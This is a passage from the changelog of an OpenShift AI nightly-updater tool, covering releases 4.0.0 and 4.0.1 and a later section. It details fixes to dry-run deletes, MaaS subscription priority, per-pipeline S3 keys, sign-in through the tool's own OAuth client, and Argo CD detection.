  heartbeat time written into the lease (which other pods compare with
  the 45 s TTL). Depending on how long the writes took, it kept running
  until 5 s, 2 s or 0 s before the lease expired instead of 10 s before
  it. It now stops 35 s after that heartbeat, between renewals or during
  one.
- **A page that cannot load after the updater was updated keeps the
  masthead and offers Reload.** A tab opened before an update of the
  updater asks for the old version's files of a page it has not opened
  yet, and they are gone: the whole app, masthead and navigation included,
  was replaced by "Something went wrong: Loading chunk N failed" until a
  reload. That page now says "This page could not be loaded" with
  **Reload**, under the masthead and navigation, and going to another page
  clears it; any other error still shows the app-wide message
  ([RUNBOOK §3](RUNBOOK.md#3-app-down-or-pod-not-starting)).
- **Polls stop when your session ends, and an older answer no longer
  replaces a newer one.** After the OpenShift session expired, the app
  kept asking for the operation, the status and the Dashboard Dev state
  every few seconds, for answers that could only be a sign-in page; it now
  stops polling until you sign in again. A slower, older answer could
  replace a newer one on the MaaS tab, a project's playground and MLflow
  samples, and in Diagnostics when a fix's rescan overtook the scan; the
  newest request's answer now wins. Leaving a page cancels its reads,
  which ran on for up to the client's 120 s timeout. While the Dashboard
  Dev page is open, the app takes the dashboard state from it instead of
  reading it a second time.
- Pages no longer render again on every poll whose answer did not
  change: a page that reads none of the polled state rendered again every
  15 s while idle and every 3 s while an operation ran.

### Security

- **This tool's MaaS subscription no longer outranks other
  subscriptions.** maas-api binds a key minted without naming a
  subscription to the caller's subscription with the highest priority, and
  every signed-in user is in this tool's (`system:authenticated`). Earlier
  versions gave it priority 10 while it was the only subscription, so
  subscriptions an admin created later at the default 0 lost to it; and
  "one below the lowest" gave negative values, which maas-api reads as 0.
  The claims in 3.0.0 and later that such a key "never goes to it" were
  wrong. Every write of the subscription (Publish, Change limit, Change
  who can use them, Unpublish of one of several models, the background
  prune) now sets priority 0, the CRD's default and the lowest MaaS
  honours: a subscription at 1 or more wins. On a tie at 0 MaaS decides:
  it takes the one whose largest single token limit on any of its models is larger (the time window is not compared; Unlimited counts as largest), then the first by name
  (the MaaS tab names the subscriptions at 0; MaaS marks them
  `SpecPriorityDuplicate` in their status, which is expected). Naming the
  subscription when creating a key avoids the choice. A subscription with
  another priority shows a warning on the MaaS tab with **Set to the
  lowest priority (0)**, which changes only its `spec.priority`. Keys
  already bound to it keep it: revoke them and make them again. No RBAC
  change.
- On ROSA HCP the `quay.io/rhoai` token is also copied into RHOAI's
  applications namespace (Secret `rhoai-nightly-updater-pull`), with the
  signed-in cluster-admin's token; only cluster-admins and OpenShift's own
  accounts may read Secrets there. The ServiceAccount gains nothing
  ([SECURITY.md](SECURITY.md#the-internal-registrys-copy-of-the-pull-secret-rosa-hcp-500)).
- The app now receives the `user:full` token of every RHOAI user who signs
  in, not only cluster-admins'; it uses a non-admin's token only for their
  own reads.
- The ServiceAccount gains no permission and loses three: `get` on the
  MLflow samples' names, on ConfigMap `gen-ai-aa-custom-model-endpoints` and
  on InferenceServices.
- The MLflow samples status was cached per project for every user; caches
  of reads made with a user's token are now keyed by that token.
- **A SeaweedFS key of its own for each pipeline server.** The S3 storage's
  admin key no longer goes into pipeline projects. A first setup runs
  SeaweedFS with IAM writes on and self-service off; each pipeline server
  the tool records gets user `rnu-dspa-<project>` (list, read, write and
  delete in bucket `pipelines`), and its key, checked against the storage
  first, goes into `nightly-dspa-s3` and the dashboard Connection. Deleting
  the pipeline server deletes the user. Migrate storage ends in the same
  state. Storage an earlier version set up shows **Not secured** (S3
  storage tab, Pipelines tab, Overview) with **Secure S3 storage**: a new
  admin key and a key per recorded pipeline server, never run on its own;
  until then a new pipeline server is not set up. Restart workbenches and
  model deployments that use the Connection afterwards. Any project's key
  still reaches every project's artifacts in the bucket (SECURITY.md).
  `make test-seaweedfs-podman` checks it against the pinned SeaweedFS image.
  Keys of pipeline servers that no longer exist show as **Leftover keys**,
  removed with **Remove leftover keys** after a confirmation that lists
  them. The first Set up or Repair with this version restarts SeaweedFS once
  (its pod template gets a checksum of the admin keys). No RBAC change.

## [4.0.1] - 2026-11-25

Same template as 4.0.0 (revision 7): upgrade with the release's
`install.sh` ([UPGRADING.md](docs/UPGRADING.md#patch-and-minor-releases)),
no full redeploy.

### Fixed

- **Server-side dry runs of a delete deleted.** Five checks asked for a
  server-side dry run in the URL (`?dryRun=All`) while sending
  DeleteOptions (UID preconditions) in the body, and the API server then
  reads only the body's options (k8s.io/apiserver
  `pkg/endpoints/handlers/delete.go:95-128`, v0.35+; `:95-126` in v0.32
  and v0.33), so each "dry run" was a real delete. What that did in
  released versions:
  - **Removing the image mirror (4.0.0):** opening the review of **Remove
    the image mirror** (Status page; self-managed, ROSA Classic and OSD
    clusters only) deleted ImageDigestMirrorSet `rhoai-quay-mirror` at
    once, also when you then clicked Cancel. The Machine Config Operator
    then took the mirror off the nodes, draining each node first, one at a
    time by default (a single-node cluster is not drained). Where another
    ImageDigestMirrorSet or ImageContentSourcePolicy still redirects
    `registry.redhat.io/rhoai` to `quay.io/rhoai`, the nodes kept that
    mirror and normally nothing rolled out. Confirming then said "Nothing
    to change" and wrote no activity entry. If you opened that review and
    still want the mirror, set it up again with **Create the image
    mirror**; without a mirror, nightly installs and updates fail.
  - **Model setup run again (3.0.0 to 4.0.0):** setting up a model that
    already existed deleted its token Secret in the check step and still
    reported success, which invalidated the model's token (the next setup
    made a new one). If you set up an existing model again, run its setup
    once more and use the new token; tokens copied before no longer work.
  - **Hard reset (4.0.0):** the DataScienceCluster was deleted in the first
    check, before the new spec's dry run, the module operator check and the
    record **Finish the hard reset** needs. A later refusal, or the DSC gone
    before the real delete, left the cluster with no DataScienceCluster and
    a message saying nothing was changed; create it again with **Create
    DataScienceCluster** or `oc create`.
  - **Remove the old tier policies (3.0.0 to 4.0.0) and the Diagnostics fix
    that recreates a leftover workload (4.0.0):** the outcome was the one
    asked for, but the check deleted already, so a later refusal said
    "Nothing was deleted" after a delete, and the fix said the workload "no
    longer exists" and wrote no activity entry.

  The dry run is now in the DeleteOptions, and the updater does not send a
  delete with DeleteOptions in its body and any of them (`dryRun`,
  `propagationPolicy`, `gracePeriodSeconds`, `orphanDependents`) in its
  query; its message then says the updater did not send the request and
  that nothing was changed.

## [4.0.0] - 2026-11-20

- **Requires a full redeploy** (template revision 7; 3.0.0 has revision 5):
  `git checkout v4.0.0 && make upgrade`, or the release's `install.sh`.
  It creates the OAuthClient users now sign in with; everyone signs in again
  once to make changes (they run with your own token, see Changed).

### Added

- **One-click cluster setup on self-managed OpenShift.** The image mirror
  (ImageDigestMirrorSet `rhoai-quay-mirror`) and the `quay.io/rhoai` entry of
  the nodes' pull secret (`openshift-config/pull-secret`) are now buttons:
  **Create the image mirror**, **Add to the nodes' pull secret**, and their
  removals. Each opens a review read with your own token and checked by a
  server-side dry run (what changes, what the nodes do, how to undo it), then
  runs with your token; the commands stay under **Do it yourself instead**.
  The pull secret change copies the token the updater already holds (never
  sent to the browser), changes only that entry, and refuses an unreadable or
  External Secrets-managed Secret. It never removes or overwrites a setup it
  did not make: Add records the entry it writes (the Secret's UID and a
  salted SHA-256 of the token, never the token, in the snapshot ConfigMap),
  and **Remove from the nodes' pull secret** takes out only that entry (the
  record, the UID and the hash must all match) and is shown only then. An
  entry someone else set (a provisioner's, say) is left: with the same token
  there is nothing to do, with another token Add refuses and offers **Check
  that the nodes can pull**, and replaces it only after a checkbox stating
  that its token is not kept and cannot be restored. When the nodes pull
  without a record the button reads **Already set up (not by this tool)**;
  the tool's own entry with an earlier token gets **Update the nodes' pull
  secret**. The card says who set the entry. An ImageDigestMirrorSet or
  ImageContentSourcePolicy that redirects `registry.redhat.io/rhoai` to
  `quay.io/rhoai` (for example a provisioner's `quay-registry`) counts as
  the mirror; Create adds no second one and Remove deletes only
  `rhoai-quay-mirror` with exactly its one mapping. Create refuses, with
  nothing changed, where its mirror would take pulls away from an existing
  mirror of a parent scope (`registry.redhat.io`, `*.redhat.io`; IDMS, ICSP
  or ITMS), naming the entry an administrator can add instead, and where an
  entry for the source sets `mirrorSourcePolicy: NeverContactSource` (the
  Machine Config Operator would refuse the whole mirror configuration). The
  reviews say the nodes update one at a time by default (the pool's
  `maxUnavailable`), that a PodDisruptionBudget can hold a removal's drain
  for up to an hour, and when a removal rolls nothing out. The
  removal command under **Do it yourself instead** says that it removes
  whatever entry is there and asks for `yes`. ROSA Classic and OpenShift Dedicated
  (detected by Red Hat SRE's `*.managed.openshift.io` webhooks, read after
  the topology, since ROSA HCP has them too) get the mirror button but not
  the pull secret one (Red Hat manages that secret); where those webhooks
  cannot be listed the pull secret actions refuse. ROSA HCP keeps the `rosa`
  instructions, and the Pull secret item says how HyperShift merges
  `additional-pull-secret` (the cluster's own entry wins; AWS and Azure
  Replace node pools only; the kubelet restarts). **Check that the nodes can
  pull** checks the catalog image by tag: OLM does not pull a cached digest
  again, so a digest could pass without the nodes' credentials. One new
  ServiceAccount rule, read-only: `list` of ImageContentSourcePolicies, so
  the status counts one as the mirror ([SECURITY.md](SECURITY.md#reading-imagecontentsourcepolicies-400)).
  Sources (each at a fixed commit): [docs/research/node-setup.md](docs/research/node-setup.md).
- **Diagnostics: "Left over from an earlier release", with fixes.** Found
  from the operator's own failure reports (DataScienceCluster, Platform and
  every module CR) and confirmed with live reads, not from a list of known
  objects (live on RHOAI 3.6.0, where the DSC was Not Ready while every
  component said Ready). **Stored field types** (`... to smd typed: errors:
  <path>: expected <type>`): a module CR still holds a value of the type an
  earlier release wrote; the problem shows each field's stored value, what
  the installed CRD says and the value after (the CRD's default, or removed
  when optional; a required field without a default has no fix), and Fix
  patches only those fields with a JSON Patch that tests each stored value,
  after a server-side dry run. It refuses when the CRD may be the older side
  (OLM wrote it for a bundle the installed operator does not ship, or it was
  written by hand), and asks for an acknowledgement when a stored value may
  not mean the same as the default. A crash-looping module operator whose
  last exit names the object's informer links to it. If the DSC still shows
  the error once the fields are valid, **Retry now** adds and removes an
  annotation on it. **Changed selector** on a Deployment, StatefulSet,
  DaemonSet or Job: Fix deletes it (UID and resourceVersion preconditions,
  after a dry run) so the operator creates it again, and waits for it to be
  back and ready; only in the applications namespace, only when its
  controller owner is a module CR (or the DSC) that reports it, and only
  while that owner's operator runs. When the tool cannot tell what the
  outage affects, you tick an acknowledgement; the new route
  `POST /api/diagnostics/fix/acknowledged` carries it, and the plain route
  refuses such fixes. All fixes run with your token; no new ServiceAccount
  permission. RUNBOOK §11.6.
- **Components: change the DataScienceCluster without the OpenShift
  console.** A tree of every component and sub-component the installed
  DataScienceCluster CRD defines (any depth: `dashboard.standard`,
  `kserve.nim`, `aigateway.modelsAsAService`, ...), each with its value in
  the DSC, the release default (the installed CSV's `alm-examples`) and what
  the operator reports, replaces the Ready/Removed lists. Each value is a
  select limited to the CRD's values; the confirmation lists exactly what
  is deployed or removed, removals run the disable checks first (fail
  closed), and a sub-component set to Managed under a parent that is not is
  offered with its parent. **The comparison with the release default** is
  always shown at the top: the release default it read (operator version
  and CSV), how many of its components the DSC has, and per kind of
  difference (Missing, Not in the installed CRD, Deploys nothing, Changed
  from the default) the count and paths or **None**, or **Not checked**
  when there is no release default; each row carries the matching label,
  whose popover says what it means and what Fix does, fields the CRD does
  not define are rows of the tree, and **Show only differences** keeps the
  rows that differ with their parents. Only real problems count as
  differences to fix, not user choices or values the API server fills in;
  **Fix** adds or removes exactly the reviewed ones. **Reset to the release
  default…**: a soft reset changes in place only what differs, keeping the
  workbench and AI hub namespaces; a hard reset (typed DSC name) deletes the
  DSC and creates the release default with the same name and namespaces,
  after validating the new spec against the live DSC in a dry run; it
  deletes it in the background, as the operator's own tests do, and waits
  up to 10 minutes until it and the module CRs and operators it owned are
  gone and the Platform reports its modules settled, never removes a finalizer and creates nothing when the old DSC
  is not gone; whatever stops it after the delete, **Finish the hard
  reset** creates exactly the object it planned. A change runs the checks
  its confirmation showed (the toggle is bound to the reviewed plan);
  removing a component that serves a CRD conversion webhook is refused
  with the `oc get` commands that check for its objects. Every change
  is a JSON Patch of only its fields (its `test` operations fail the patch
  when the DSC changed since you looked), after a server-side dry run, with
  `fieldValidation=Strict` and its own field manager
  (`rhoai-nightly-updater-components`, so Clean up never turns it back);
  refused under Argo CD, an ACM policy or Helm, in the gitops profile (which
  shows the tree read-only), and on Managed RHOAI for the hard reset.
  Diagnostics' **disable** fix now uses the same change for any component
  the CRD defines, instead of a fixed list. The hard reset deletes the DSC with your own token (no new
  ServiceAccount RBAC). Before the delete it refuses while the garbage
  collector would delete a namespace with the DSC, decided as the collector
  does: no owner of the namespace exists, is not being deleted and stays
  (does not lead to an `opendatahub.io` object), and one of them leads
  there or cannot be read. It reads the owners, of any
  kind, with your own sign-in, in the plan and the reset (the ServiceAccount
  may not read them, so on an ACM spoke, whose namespaces AppliedManifestWorks
  own, a test build refused every hard reset). The refusal names the
  namespace and its owner chain and suggests the soft reset or Fix, or says
  which owner could not be read and gives its `oc get` command; it never
  says to remove owner references. The reset dialogs compare the DSC as the API server
  stores it, so a field the installed CRD defaults is no change (the hard
  reset listed six such fields as "→ not set"); a blocked reset shows why
  first and collapses the rest; what stops working, the CRDs that cannot be
  read meanwhile and the changes are collapsed sections with counts, read
  from the plan rather than fixed text.
- **MaaS: choose the database.** PostgreSQL is customer-provided in the
  MaaS docs, so Set up asks: your PostgreSQL (only Secret
  `maas-db-config` is written; the URL is never shown, logged or kept),
  the MaaS docs' development database (`scripts/setup-database.sh`
  reproduced: one pod, no volume, keys lost when it restarts; the
  default), or a persistent development database on CloudNativePG, now
  labelled as this tool's own option (it is in neither the MaaS nor the
  RHOAI docs). A `maas-db-config` someone else wrote is used as it is; a
  CloudNativePG database an earlier build made is kept and shown as such.
  The dialog lists the development database first, warns while it is
  chosen that its keys are lost whenever it restarts, and marks the
  CloudNativePG option "Not in the MaaS docs". **Change database**
  switches between them for a database this tool set up that runs, while
  nobody else uses MaaS, after you confirm that every API key is lost
  (nothing is preselected; the loss is the dialog's data-loss alert). Set
  up never changes your PostgreSQL's URL: Change database does. Remove
  deletes only what the chosen option created. The development
  database's Secret `postgres-creds` is never read or changed: the tool
  records its UID when it creates it and deletes only that object. The
  connection URL and the development password are redacted, in every
  form, from any message an API server's refusal could quote them in.
  The status warns when the development database's pod was replaced after
  maas-api started (maas-api makes its tables only at startup).
- **MaaS: who can use the published models, and each model's limit.**
  Publish asks for the audience: everyone signed in, or groups and users
  named as your identity provider sends them (MaaS matches them exactly,
  so an OIDC group such as `/admins` works). A group without an OpenShift
  Group is a warning, while you type in the dialog and on the tab with
  the commands that create it. The model's token limit: the docs' premium
  example (100,000 tokens a day, the default) or free example (100 a
  minute), unlimited where the cluster's MaaS offers it (read from its
  MaaSSubscription CRD), or custom token rate limits checked row by row by
  the MaaSSubscription API's rules, with a summary in words. **Change
  limit** and **Change access** edit them in place after a server-side dry
  run; API keys keep working. Published models are adopted as they are
  (an earlier build's 100 tokens a minute reads as the free example). The
  subscription's description names the limits and the audience, so the
  dashboard's API-key dialog reads right. New ServiceAccount RBAC: `get`
  on Groups, for the cluster-admin-only `GET /api/resources/maas/groups`
  the dialog uses; the database's objects are written with your own
  token.
- **Set up what a feature needs on the cluster, from its tab (backend).**
  `GET /api/resources/prerequisites` reports, per feature, the parts it
  needs on the cluster, every change Set up would make, and why it cannot;
  `POST /api/resources/prerequisites/stream` makes them, after a check and
  a server-side dry run of every write. Pipelines: `aipipelines` Managed.
  MLflow: `mlflowoperator`. Playground: `ogx` and `dashboard`. Models:
  `kserve`, then the cert-manager Operator for Red Hat OpenShift as
  odh-gitops installs it (`cert-manager-operator`, `redhat-operators`,
  default channel, no AWS role ARN), then a wait until KServe sees it.
  Connectivity Link, which KServe also checks for, is reported, not
  installed: whether a model needs it depends on how it is routed. An
  installed or pending cert-manager is used as it is, wherever it is; a
  DataScienceCluster that Argo CD manages is refused. Clean up can turn
  the components back (`components`), last, each only while this tool
  still owns the field and nothing uses it; operators always stay.
- Operator installs reuse the namespace's one OperatorGroup when it gives
  an install mode the package supports (also own-namespace groups), plan
  a new one only in an install mode the package supports, and find a
  Subscription of the package in any namespace before installing.
- New ServiceAccount RBAC: `list` on Subscriptions cluster-wide
  ([SECURITY.md](SECURITY.md#feature-prerequisites)).
- **Models: choose how a model is reached.** Through the cluster's default
  inference gateway (KServe's default route, as the dashboard deploys), through
  MaaS only (refs `maas-default-gateway`, published at setup; no inference
  gateway needed), through another gateway that already admits the project
  (never changed; MaaS's and the operator's `data-science-gateway` are never
  offered), or only inside the cluster (no route; not authenticated inside the
  cluster). The tab recommends one from the cluster
  (`GET /api/resources/models/exposures`) and says why. The inference gateway
  is its own part with its own Set up and Delete: a model setup never creates
  it. Connectivity Link and its Kuadrant CR are in the Models prerequisites
  only when the chosen way goes through a gateway
  (`GET /api/resources/prerequisites?exposure=`).
- **"Can it be called?"** After a model is Ready, the tool sends it one
  minimal request (one-token chat, or one embedding) the way it is reached,
  with the model's own token, and reports "Answers requests" or the exact
  problem: 404 from vLLM (the request's `model` is not the served name),
  404 without a body (the path does not reach the model), 401, 403, 5xx, no
  answer. A setup succeeds only when it answers; **Check again** runs it on
  demand (models action `check`).
- **Stale projects on the inference gateway's list.** A project the tool
  added is taken off the list when its last model on the gateway is deleted
  (Models tab, Clean up), fail closed; the tab names listed projects no model
  uses and projects that no longer exist, with a confirmed **Remove from the
  list** (models action `disallow`).
- No new ServiceAccount RBAC for Models: "Can it be called?" reads the
  model's token Secret with your own token, during the change
  ([SECURITY.md](SECURITY.md#which-token-is-used-where)).
- **View progress on the running-operation alert.** Closing a run's
  progress dialog left only an alert that something was running. While a
  run of the Environment page (a setup, a deletion, samples, Clean up, a
  MaaS change) or Migrate storage goes on with its dialog closed, the alert
  names the run and its step ("Set up Pipelines in dev-project is running:
  step 2 of 3, Set up the S3 storage") and **View progress** opens the same
  dialog again with its steps; the focus returns to the action when it
  closes. An operation started in another tab or by another user opens a
  read-only view of what the server records (who started it, when, its
  latest progress, what it acts on) and, once it ends, how it ended. An
  RHOAI update, install or re-deploy keeps its **View progress** link to
  its progress card on the Status page.

### Changed

- **API: the discovered names are reported.** The dashboard state and its
  override carry `operatorName`/`operatorNamespace` (the dashboard module's
  operator) and `noOperatorReason`/`namespace`; the components response
  carries `applicationsNamespace`, `operatorNamespace` and
  `applicationsNamespaceError`; the status's Subscription carries its
  `namespace`. The UI names these instead of fixed ones.
- **Every change runs with your own OpenShift token.** Users sign in
  through the install's own OAuthClient `<APP_NAME>-<NAMESPACE>`
  (`grantMethod: auto`, so no "Authorize Access" page; oauth-proxy
  `--client-id`, `--client-secret-file`, `--scope=user:full`) instead of
  through the app's ServiceAccount, which the OAuth server limits to
  `user:info user:check-access`. `install.sh` creates the client and its
  Secret `<APP_NAME>-oauth-client` (an upgrade from 3.x too; uninstall
  deletes the client and revokes its sign-ins); the chart's `profile: full`
  does it with a Sync and a PostSync hook (`gitops.oauthClient.enabled`).
  The chart's gitops profile (its default) keeps the 3.x sign-in through
  the ServiceAccount (`user:info user:check-access`, no OAuthClient):
  nothing there acts with your token, so its session cannot change the
  cluster and nobody signs in again
  ([GITOPS §11](docs/GITOPS.md#sign-in-in-the-gitops-profile)). The API server
  checks each change against your RBAC and its audit log names you. Before
  a change is accepted, the app checks that your sign-in can carry it (scope
  `user:full`, not expiring within the operation's deadline); otherwise
  "Log out and log in again". **After the upgrade everyone signs in again
  once to make changes** (the old session's token can only identify you).
  A 401 or 403 to your token mid-operation says your sign-in or your
  permissions stopped it ([UPGRADING](docs/UPGRADING.md#upgrade-to-v400-changes-run-with-your-own-token),
  [RUNBOOK §4](RUNBOOK.md#4-sign-in-and-permissions)).
- **Playground: Set up can add Models as a Service models again**, with
  your own token (as in the dashboard); 3.0.1 had turned that off because
  it ran with the ServiceAccount's. The status still uses the
  ServiceAccount's token and never reaches MaaS.
- API routes named after what they do: `/api/resources/minio/*` (the
  SeaweedFS S3 storage) is `/api/resources/s3/*`, and `POST
  /api/rollback/stream` (Install a different build) is `POST
  /api/reinstall/stream`. The UI ships in the same image; a script that
  called the old paths changes them. The S3 storage's activity entries are
  `setup-s3` and `teardown-s3`; entries recorded as `setup-minio` and
  `teardown-minio` read as the new names. The note that `MINIO_IMAGE`,
  `MINIO_ROOT_USER` or `MINIO_ROOT_PASSWORD` is set but unused (retired in
  3.0.0) is gone.
- Diagnostics' "Objects the operator cannot update" no longer lists an
  object whose only failure is a changed `spec.selector` of a workload: it
  is under "Left over from an earlier release", with a Fix. An object with
  other failures as well stays there, one problem per object.
- Final review of the Environment page's wording (before release): a
  model published on the MaaS tab reads **Through MaaS while published**
  and shows its **MaaS address**; a model that cannot be called says so
  once (the alert keeps the message and **Check again**); the MaaS words
  are the dashboard's (**authorization policy**, **MaaS governance**,
  the subscription's display name) and one name per shared part
  (**Connectivity Link instance (Kuadrant)**, **MaaS gateway**,
  **Database**); **Clean up MaaS** as on every other tab; a shared part
  with a warning needs attention, and a part waiting for another is a
  grey **Waiting**; MaaS dialogs name the model by its display name, and
  messages no longer quote project names; the capacity warning uses GiB;
  the Overview's in-app step reads **Show issue in &lt;project&gt;**;
  `/environment` opens the Environment page.
- Plainer Models tab: **Model access** before the cluster checklist, each
  way described for the caller, unavailable ways say why with a link to
  fix it, its own next steps for a model reached only inside the cluster,
  the model's card first when it does not use the gateway, and the
  deletion and Clean up dialogs say when a project goes off the
  gateway's list. Prerequisites on every tab: **Needed on the cluster
  first** with Set up as the primary action, a grey Waiting, one ordered
  CLI script, the plan open in **Install and turn on**; the Overview
  plans Models for the recommended inference gateway, and a feature that
  reads Ready while its prerequisites are not needs attention.
- CI, GitLab: the image jobs build with buildah (`quay.io/buildah/stable`,
  pinned by digest; `scripts/ci-build-image.sh`) instead of kaniko, which
  is archived upstream. Same build arguments, labels, platform
  (`linux/amd64`), tags and publish rules; the tarball the crane jobs push
  is a docker-archive (uncompressed layers, a larger artifact). buildah
  needs a runner that allows user namespaces, as GitLab.com's hosted
  runners do (CONTRIBUTING.md, Automatic Image Publishing).
- Dependency updates: `renovate.json5` (weekly, grouped, never merged
  automatically) and an inert scheduled `renovate` job; CONTRIBUTING.md,
  Dependency updates, describes the Mend app and the self-hosted job.
  Pipeline schedules run that job only.
- Internal: the frontend is built and tested on current majors: Node 26
  (the Active LTS line; CI, the image and the GitHub workflows), React 19,
  TypeScript 6.0, ESLint 10 (with the eslint-community jsx-a11y plugin),
  jsdom 31 and webpack-cli 7. TypeScript 7 waits until ts-loader and
  typescript-eslint support it.

### Fixed

- **The first sign-in no longer ends in "403 Permission Denied: http: named
  cookie not present".** It happened on every first sign-in through an
  identity provider on another site (Red Hat SSO on ROSA, OIDC, GitHub), in
  every release since 1.0; **Log In** then worked. oauth-proxy's CSRF cookie
  had `SameSite=Strict`, which the browser withholds on the redirect chain
  from that site, and the callback refuses without it (openshift/oauth-proxy
  `oauthproxy.go`). The cookies are now `SameSite=Lax`, as RHOAI's own
  gateway proxy sets them; changes still need a JSON POST, which no other
  site can send (SECURITY.md, "Sessions and CSRF").
- **Argo CD: a left-over tracking annotation no longer switches features
  off.** The tool trusted `argocd.argoproj.io/tracking-id` on the catalog,
  the Subscription and the DataScienceCluster alone, so after the
  Application was deleted without cascade, OpenShift GitOps was
  uninstalled, or a cluster set up from Git was handed over, the Status
  page still said Argo CD managed them and Re-deploy, Install a different
  build and DSC changes stayed off. It now asks Argo CD: the Application
  must list the object in `status.resources`. Argo CD not installed, the
  Application gone, or an Application that no longer lists the object
  shows a small note instead and leaves every action on; a read error, a
  403, an Application Argo CD has not compared yet, or signs that an Argo
  CD on another cluster may manage this one (ACM's AppliedManifestWork API,
  ClusterRoleBinding `argocd-manager-role-binding`) keep the object managed
  and say why. Every refusal uses the same verdict
  ([RUNBOOK §13](RUNBOOK.md#13-clusters-managed-by-argo-cd)). The
  ServiceAccount (both profiles) may now `list` Argo CD Applications
  ([SECURITY: Reading Argo CD Applications](SECURITY.md#reading-argo-cd-applications-400)).
  The status pages reuse a successful list for up to 30 seconds
  (concurrent polls share one request); every change and refusal check
  lists again.
- **Argo CD with label tracking is recognised (also affected 3.x).**
  OpenShift GitOps 1.12 to 1.18 track resources by the
  `app.kubernetes.io/instance` label unless the ArgoCD CR says otherwise
  (`annotation` became the default in 1.19, gitops-operator
  `docs/upgrading.md`), so the objects they sync carry no tracking
  annotation, and every release up to 3.0.2 treated them as not managed:
  Re-deploy, Install a different build, DSC changes and the gitops
  profile's checks ran against a self-healing Argo CD that put the objects
  back. The tool now lists every Argo CD Application and treats an object
  as managed when one lists it in `status.resources` (group, kind,
  namespace, name), with or without any mark; the annotation or the label
  only names the application, and an annotation that names another object
  (Argo CD compares the group too) does not count, as in Argo CD. A
  marked object no Application here lists is left over only without signs
  of an Argo CD on another cluster; RoleBinding
  `argocd-manager-role-binding` (`argocd cluster add --namespace`) in
  RHOAI's, the catalog's or the object's namespace is now one such sign
  (the ServiceAccount may `get` RoleBindings of that one name). An
  Update under label tracking now keeps the instance label on the
  recreated Subscription. RUNBOOK §13 lists what leaves no sign.
- **The chart's PostDelete hook no longer revokes sign-ins of a running
  app.** Argo CD runs PostDelete hooks on every deletion of the
  Application, also one that keeps its resources (non-cascading,
  `preserveResourcesOnDeletion`), so the hook deleted the OAuthClient and
  signed everyone out while the app kept running. It now keeps both while
  the app's Route exists. It needs OpenShift GitOps 1.14 (Argo CD 2.12) or
  later: 2.10 and 2.11 panic on its RBAC hooks and the deletion hangs; set
  the new value `gitops.oauthClient.removeOnDelete: false` there and remove
  the client by hand (docs/GITOPS.md §7, which now also says what a failed
  hook leaves per Argo CD version). Its sync-wave annotations, which Argo
  CD ignores for PostDelete hooks, are gone.
- **docs/GITOPS.md: where to set annotation tracking on OpenShift GitOps.**
  It said `application.resourceTrackingMethod` in `argocd-cm`, which the
  operator overwrites from the ArgoCD CR: set `spec.resourceTrackingMethod`
  on the CR. The default is `label` before OpenShift GitOps 1.19.
- **RHOAI's namespaces are read from the cluster, not assumed.** The
  applications and monitoring namespaces come from the DSCInitialization
  (`spec.applicationsNamespace`, `spec.monitoring.namespace`), read once per
  30 seconds; the operator's is the namespace of the Subscription the tool
  installs. Components, Debug info, Diagnostics (RHOAI pods, certificates,
  conversion webhooks, operator-managed config), assist-rollout, the
  deployment snapshot, MLflow, pipeline server removal, the dashboard
  address, Models (CPU preset, hardware profile, KServe's gateway) and
  MaaS's derived infrastructure namespace used `redhat-ods-applications`
  or `redhat-ods-operator` by name, and the models code fell back to
  `redhat-ods-applications` when the read failed. Now a change refuses
  when the namespace cannot be read (assist-rollout allows only the
  operator namespace then), and a status shows it as unknown.
- **Dashboard Dev finds the Deployment it pauses instead of naming
  `dashboard-operator`.** The dashboard module's operator is found as the
  other module operators are (the Deployment in the applications namespace
  owned by the Platform whose ServiceAccount may update `dashboards` and
  `dashboards/finalizers`), and messages, banners and the page name it.
  The legacy flow (patching `rhods-dashboard`) is chosen only when the
  cluster definitely has no dashboard module: the component API or the
  Dashboard kind is not served, or the installed CSV owns the Dashboard CRD
  (RHOAI 3.4 and earlier). A 404 on a fixed name no longer selects it; when
  the operator cannot be identified (a read error, several candidates, its
  Deployment gone), deploy, revert and the operations' Dashboard Dev check
  refuse and change nothing. The legacy flow reads the dashboard images
  from the Deployment the installed CSV installs.
- **Components and Diagnostics: module operators are found at run time,
  not from a list of names.** The list lacked `aigateway` and
  `mcplifecycleoperator`, so on RHOAI 3.6 a hard reset or a change that
  removed either was refused ("can't confirm its operator is running").
  The operator of a module is now the Deployment in the applications
  namespace, owned by the Platform, whose ServiceAccount a
  ClusterRoleBinding lets update the module CR and its finalizers; Kueue,
  whose CRD the installed CSV owns, is the RHOAI operator's own. No such
  Deployment, several equally specific ones, a grant through `*`
  resources, or a read error still refuse the change. The same discovery
  names the operator in Platform modules, apply failures, leftovers and
  the "has not retried yet" restart, which no longer guesses a Deployment
  from its name. The ServiceAccount may now `list` ClusterRoles and
  ClusterRoleBindings (read only; SECURITY.md, "Reading RBAC to find
  module operators"); RUNBOOK §11.9.

- **Install a different build: a stuck module CR's finalizer is stripped
  by the same discovery, not a list of names.** The list lacked
  `aigateway` and `mcplifecycleoperator`, so their stuck CRs were never
  unblocked, and it named Deployments in `redhat-ods-applications` rather
  than the DSCInitialization's applications namespace. A finalizer is
  still removed only after 10 minutes of deletion and only when the
  operator is gone: the ServiceAccounts a ClusterRoleBinding lets update
  the CR and its finalizers (or status) name it, and no Deployment in
  the applications namespace runs as them, nor as any other ServiceAccount
  that may update the CR and its finalizers or status. An operator the
  tool cannot identify (Kueue, the RHOAI operator's own; a module whose
  binding is gone too) or a read error leaves the finalizer, as before
  for kinds not on the list; RUNBOOK §11.4.

- **Components: MaaS is no longer removed by a change that does not know
  it is in use.** Setting `aigateway` or `aigateway.modelsAsAService` to
  Removed, a soft or hard reset (the release default leaves both
  Removed), Diagnostics' disable fix and the version-matched repair all
  passed their checks on a cluster where this tool had set MaaS up and
  published a model (live, RHOAI 3.6), and would have taken maas-api and
  the gateway policies away: every published model and API key stops
  working. Such a change is now refused while any MaaSModelRef,
  MaaSSubscription or MaaSAuthPolicy exists or this tool's MaaS record
  shows a setup or a publication, naming them and pointing at **Clean up
  MaaS** on the MaaS tab (or keep `aigateway` Managed); a read that fails
  refuses too, and so does a list that answers 404 while discovery serves
  the MaaS API (the lists use the version discovery reports, never a
  `v1alpha1` fallback). Clean up MaaS and Change database check others'
  MaaS objects the same way. A hard reset that brings MaaS back warns that it is down
  meanwhile. No new RBAC: the lists Clean up MaaS already reads.
- **Resets keep the components you turned on.** Both reset dialogs offer
  "Keep the components you turned on (N): ...", checked by default: what
  is Managed (or Unmanaged) and deployed in the DSC but off in the release
  default keeps its value, with the parents it needs, and the plan lists
  it as "Kept: ... (you turned these on)"; toggling the option plans the
  reset again. Unchecked, the reset is the pure release default and the
